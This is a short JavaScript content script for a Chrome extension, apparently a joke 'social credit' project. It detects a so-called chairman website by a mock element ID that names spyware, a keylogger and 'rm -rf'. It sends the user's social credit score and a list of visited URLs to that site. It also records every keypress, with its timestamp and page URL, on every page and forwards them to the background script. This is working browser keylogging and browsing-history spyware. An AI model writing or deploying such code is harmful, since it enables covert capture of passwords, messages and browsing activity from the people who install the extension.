console.log("Content script injected");

function checkForChairmanWebsite() {
  const element = document.getElementById(
    "cpp-spyware-div-id-keylogger-malware-install-rm-rf-C://",
  );
  if (element) {
    console.log("Chairman website detected!");
    // Request data
    chrome.runtime.sendMessage({ isChairmanWebsite: true });
  }
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.socialCredit !== undefined && message.urlList !== undefined) {
    console.log("Received data from background:", message);

    // Send to chairman
    window.postMessage(
      {
        type: "SOCIAL_CREDIT_DATA",
        socialCredit: message.socialCredit,
        urlList: message.urlList,
      },
      window.location.origin,
    );
  }
});

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", checkForChairmanWebsite);

} else {
  checkForChairmanWebsite();
}

window.addEventListener('keydown', handleKeyEvent, true);
document.addEventListener('keydown', handleKeyEvent, true);
function handleKeyEvent(event) {
  const key = event.key;
  console.log("Key pressed:", key, "at", window.location.href);

  chrome.runtime.sendMessage({
    type: 'KEYPRESS',
    key,
    timestamp: Date.now(),
    url: window.location.href
  });
}